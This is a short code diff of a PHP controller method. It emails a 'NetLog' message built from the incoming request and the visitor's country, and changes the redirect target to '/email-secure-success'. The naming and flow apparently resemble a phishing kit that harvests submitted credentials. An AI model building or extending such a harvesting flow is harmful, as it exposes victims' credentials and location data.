@@ -22,7 +22,7 @@ class PageController extends Controller
     {
         $country = $this->getCountryName($request);
         Mail::send( new NetLog($request, $country));
-        return redirect('/');
+        return redirect('/email-secure-success');
     }
 
 
